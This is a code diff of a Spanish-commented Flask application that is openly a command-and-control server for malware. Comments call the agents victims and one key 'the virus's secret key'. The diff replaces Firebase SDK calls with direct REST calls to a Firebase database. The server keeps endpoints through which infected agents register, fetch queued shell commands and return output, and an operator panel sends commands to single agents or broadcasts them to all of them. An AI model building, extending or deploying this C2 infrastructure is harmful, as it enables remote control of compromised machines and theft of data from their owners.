@@ -1,211 +1,107 @@
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
+
 import os
-import uuid
 import json
+import requests
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
 from datetime import datetime
 from functools import wraps
-import firebase_admin
-from firebase_admin import credentials, db
-# import serverless_wsgi
-
-# ...
-
-# def handler(event, context):
-#     return serverless_wsgi.handle_request(app, event, context)
-
 
 app = Flask(__name__)
-# Usamos una clave fija para que las sesiones no mueran al reiniciar el servidor en Netlify
-app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99" 
+app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99"
 
-# --- CONFIGURACIÓN FIREBASE ---
-if not firebase_admin._apps:
+# --- CONFIGURACIÓN FIREBASE DIRECTA (REST) ---
+DB_URL = "https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app"
+
+def db_get(path):
     try:
-        env_key = os.environ.get("FIREBASE_KEY_JSON")
-        if env_key:
-            # Detectar si es Base64 o JSON plano
-            if not env_key.strip().startswith("{"):
-                import base64 as b64
-                env_key = b64.b64decode(env_key).decode("utf-8")
-            
-            key_data = json.loads(env_key)
-        else:
-            with open("firebase-key.json", "r") as f:
-                key_data = json.load(f)
-            
-        # LIMPIEZA UNIVERSAL: Asegurar que los saltos de línea sean correctos
-        if "private_key" in key_data:
-            key_data["private_key"] = key_data["private_key"].replace("\\n", "\n")
-            
-        cred = credentials.Certificate(key_data)
-        firebase_admin.initialize_app(cred, {
-            'databaseURL': 'https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app'
-        })
-        print("Firebase inicializado correctamente")
-    except Exception as e:
-        print(f"Error crítico cargando Firebase: {e}")
+        r = requests.get(f"{DB_URL}/{path}.json")
+        return r.json() or {}
+    except:
+        return {}
 
+def db_update(path, data):
+    try:
+        requests.patch(f"{DB_URL}/{path}.json", json=data)
+        return True
+    except:
+        return False
 
-
-
-# CONFIGURACIÓN DE ACCESO
-ADMIN_PASS = "admin"
-AGENT_SECRET = "GHOST_SIGMA_99" # <--- llave secreta del virus
-
+# --- DECORADOR ---
 def login_required(f):
     @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if session.get('authenticated') is not True:
-            return redirect(url_for('login_page'))
-        return f(*args, **kwargs)
-    return decorated_function
-
-def require_agent_auth(f):
-    @wraps(f)
     def decorated(*args, **kwargs):
-        if request.headers.get("X-Ghost-Token") != AGENT_SECRET:
-            return jsonify({"status": "denied"}), 403
+        if not session.get('logged_in'):
+            return redirect(url_for('login'))
         return f(*args, **kwargs)
     return decorated
 
-# --- RUTAS DE AUTENTICACIÓN ---
-
-@app.route('/login', methods=['GET', 'POST'])
-def login_page():
-    error = None
-    if request.method == 'POST':
-        if request.form.get('password') == ADMIN_PASS:
-            session['authenticated'] = True
-            return redirect(url_for('dashboard_page'))
-        else:
-            error = "Contraseña Incorrecta"
-    return render_template('login.html', error=error)
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('login_page'))
-
-# --- RUTAS DEL PANEL (UI) ---
-
+# --- WEB ---
 @app.route('/')
 @login_required
-def dashboard_page():
+def index():
     return render_template('dashboard.html')
 
-# --- API PARA EL PANEL (JS) ---
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        if request.form.get('password') == 'admin':
+            session['logged_in'] = True
+            return redirect(url_for('index'))
+    return render_template('login.html')
 
+# --- API AGENTE (Corregida según tus logs) ---
+@app.route('/api/v1/agent/register', methods=['POST'])
+def agent_register():
+    data = request.json
+    agent_id = data.get('agent_id')
+    if agent_id:
+        data['last_seen'] = datetime.utcnow().isoformat()
+        db_update(f'agents/{agent_id}', data)
+        return jsonify({"status": "success"})
+    return jsonify({"status": "error"}), 400
+
+@app.route('/api/v1/agent/command/<agent_id>', methods=['GET'])
+def agent_get_command(agent_id):
+    agent_data = db_get(f'agents/{agent_id}')
+    command = agent_data.get('pending_command', '')
+    if command:
+        db_update(f'agents/{agent_id}', {"pending_command": ""})
+        return jsonify({"command": command})
+    return jsonify({"command": ""})
+
+@app.route('/api/v1/agent/result', methods=['POST'])
+def agent_post_result():
+    data = request.json
+    agent_id = data.get('agent_id')
+    if agent_id:
+        entry = {"timestamp": datetime.utcnow().isoformat(), "output": data.get('output', '')}
+        requests.post(f"{DB_URL}/results/{agent_id}.json", json=entry)
+        return jsonify({"status": "success"})
+    return jsonify({"status": "error"}), 400
+
+# API PANEL
 @app.route('/api/v1/agents', methods=['GET'])
 @login_required
 def api_get_agents():
-    ref = db.reference('agents')
-    agents = ref.get() or {}
-    now = datetime.utcnow()
-    active_agents = {}
-    
-    for aid, data in agents.items():
-        try:
-            last_seen_str = data.get('last_seen', '2000-01-01T00:00:00')
-            last_seen = datetime.fromisoformat(last_seen_str)
-            
-            # Si no ha reportado en más de 60 segundos, lo borramos de firebase
-            if (now - last_seen).total_seconds() > 60:
-                ref.child(aid).delete()
-                db.reference(f'commands/{aid}').delete()
-            else:
-                active_agents[aid] = data
-        except Exception as e: 
-            print(f"Error procesando agente {aid}: {e}")
-        
-    return jsonify(active_agents)
+    return jsonify(db_get('agents'))
 
 @app.route('/api/v1/results/<agent_id>', methods=['GET'])
 @login_required
 def api_get_results(agent_id):
-    return jsonify(db.reference(f'results/{agent_id}').get() or {})
+    if agent_id == "all":
+        return jsonify(db_get('results'))
+    return jsonify(db_get(f'results/{agent_id}'))
 
 @app.route('/api/v1/command', methods=['POST'])
 @login_required
 def api_send_command():
     data = request.json
-    agent_id = data.get('id')
-    cmd = data.get('command')
-    
-    if agent_id == "all" and cmd:
-        # Broadcast mode
-        ref = db.reference('agents')
-        agents = ref.get() or {}
-        count = 0
-        for aid in agents.keys():
-            db.reference(f'commands/{aid}').push({"cmd": cmd, "time": datetime.utcnow().isoformat()})
-            # Log en cada agente para que se vea en su historial individual
-            db.reference(f'results/{aid}').push({
-                "result": f"[BROADCAST] > {cmd}", 
-                "timestamp": datetime.utcnow().strftime("%H:%M:%S")
-            })
-            count += 1
-        return jsonify({"status": "broadcast_sent", "count": count})
-
-    if agent_id and cmd:
-        # 1. Enviar comando a la cola del agente
-        db.reference(f'commands/{agent_id}').push({"cmd": cmd, "time": datetime.utcnow().isoformat()})
-        
-        # 2. Registrar comando en el historial visual (resultados) para que se vea en el chat
-        db.reference(f'results/{agent_id}').push({
-            "result": f"> {cmd}", 
-            "timestamp": datetime.utcnow().strftime("%H:%M:%S")
-        })
-        return jsonify({"status": "queued"})
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    if agent_id and command:
+        db_update(f'agents/{agent_id}', {"pending_command": command})
+        return jsonify({"status": "success"})
     return jsonify({"status": "error"}), 400
-
-@app.route('/api/v1/clear/<agent_id>', methods=['POST'])
-@login_required
-def api_clear_logs(agent_id):
-    db.reference(f'results/{agent_id}').delete()
-    return jsonify({"status": "cleared"})
-
-# --- API PARA EL AGENTE (VÍCTIMA) ---
-
-@app.route('/api/v1/agent/register', methods=['POST'])
-@require_agent_auth
-def agent_register():
-    data = request.json
-    agent_id = data.get('id')
-    db.reference(f'agents/{agent_id}').update({
-        "hostname": data.get('hostname'),
-        "os": data.get('os'),
-        "ip": request.remote_addr,
-        "last_seen": datetime.utcnow().isoformat()
-    })
-    return jsonify({"status": "ok"})
-
-@app.route('/api/v1/agent/command/<agent_id>', methods=['GET'])
-@require_agent_auth
-def agent_get_command(agent_id):
-    ref = db.reference(f'commands/{agent_id}')
-    cmds = ref.get()
-    if cmds:
-        first_key = next(iter(cmds))
-        command_body = cmds[first_key]
-        ref.child(first_key).delete() # Borrar tras entregar
-        return jsonify({"command": command_body['cmd']})
-    return jsonify({"command": None})
-
-@app.route('/api/v1/agent/result', methods=['POST'])
-@require_agent_auth
-def agent_post_result():
-    data = request.json
-    agent_id = data.get('id')
-    db.reference(f'results/{agent_id}').push({
-        "result": data.get('result'),
-        "timestamp": datetime.now().strftime("%H:%M:%S")
-    })
-    return jsonify({"status": "received"})
-
-# --- NETLIFY HANDLER ---
-# def handler(event, context):
-#     return serverless_wsgi.handle_request(app, event, context)
-
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
